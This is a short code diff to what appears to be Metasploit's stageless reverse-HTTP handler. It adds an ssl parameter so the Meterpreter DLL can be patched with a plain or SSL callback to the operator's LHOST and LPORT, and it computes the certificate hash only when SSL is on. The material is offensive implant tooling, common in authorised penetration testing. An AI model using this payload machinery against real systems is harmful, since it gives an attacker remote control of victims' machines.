@@ -26,7 +26,7 @@ module Handler::ReverseHttp::Stageless
     ], self.class)
   end
 
-  def generate_stageless(&block)
+  def generate_stageless(ssl, &block)
     url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}#{generate_uri_uuid_mode(:connect)}/"
 
     unless block_given?
@@ -49,12 +49,15 @@ module Handler::ReverseHttp::Stageless
       #  end
       #end
 
-      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
-                                           datastore['HandlerSSLCert'])
+      verify_cert_hash = nil
+      if ssl
+        verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
+                                             datastore['HandlerSSLCert'])
+      end
 
       Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
         :url           => url,
-        :ssl           => true,
+        :ssl           => ssl,
         :ssl_cert_hash => verify_cert_hash,
         :expiration    => datastore['SessionExpirationTimeout'].to_i,
         :comm_timeout  => datastore['SessionCommunicationTimeout'].to_i,
